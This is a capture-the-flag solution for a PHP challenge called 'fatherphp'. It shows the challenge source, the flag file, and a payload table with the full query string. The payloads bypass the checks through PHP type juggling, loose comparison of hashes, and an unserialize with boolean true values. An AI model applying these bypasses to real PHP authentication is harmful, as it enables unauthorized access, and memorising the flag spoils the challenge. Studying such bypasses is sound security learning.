## code `fatherphp.php`
```php
<?php

include('flag_fp.php');

highlight_file('fatherphp.php');

$a = $_GET['key1'];

if($a==56 || $a>256){
  die("Really???");
}
elseif(chr($a)==="8"){
  echo "Carry on" . "<br>";
  echo $flag1 . "<br>";
}
else{
  die("You are not good");
}

$b = $_GET['key2'];

if(strpos($b,'8')!==false){
  die("It won't be that easy");
}
for($i=0;$i<=1;$i++){
  ++$b;
}
if($b==10){
  echo "Good luck" . "<br>";
  echo $flag2 . "<br>";
}
else{
  die("No Luck");
}

$m = md5($_GET['rq']);

if($_GET['fp'] == $m){
  echo $flag3."<br>";
}
elseif(isset($fp)){
  die("You failed");
}

$n = hash('ripemd160',$_GET['np']);

if($_GET['nq'] === $n){
  echo $flag4."<br>";
}
elseif(isset($np)){
  die("You failed");
}

$hell=$_GET['key3'];
if(strpos($hell, 'i')!==false || strpos($hell, 'I')!==false){
  die("You...can't...");
}
$data = unserialize($hell);
if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
 echo $flag5 . "<br>";
} else {
 die("useless");
}

?>

```

## code `flag_fp.php`

```php
$flag1 = "secarmy{y0u";
$flag2 = "_5h0uld_a";
$flag3 = "v01d_";
$flag4 = "pHp_d0n";
$flag5 = "7'you??}";
$adminName = sha1(mt_rand());
$adminPassword =  sha1(mt_rand());
```
## PAYLOAD
|key|value|
|--|--|
|key1| `-71857864`|
|key2 | `1e1 - 2`|
|rq| `rq`|
|fp| `c6d8c86cf807f3f3b38850342d1531b3`|
|np| `np`|
|nq| `f48bc65fa1e0549ba479b41e57a4006a861358fc`|
|key3| `a:2:{s:8:"username";b:1;s:8:"password";b:1;}`|


```
?key1=-71857864&key2=1e1%20-2&rq=rq&fp=c6d8c86cf807f3f3b38850342d1531b3&np=np&nq=f48bc65fa1e0549ba479b41e57a4006a861358fc&key3=a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```


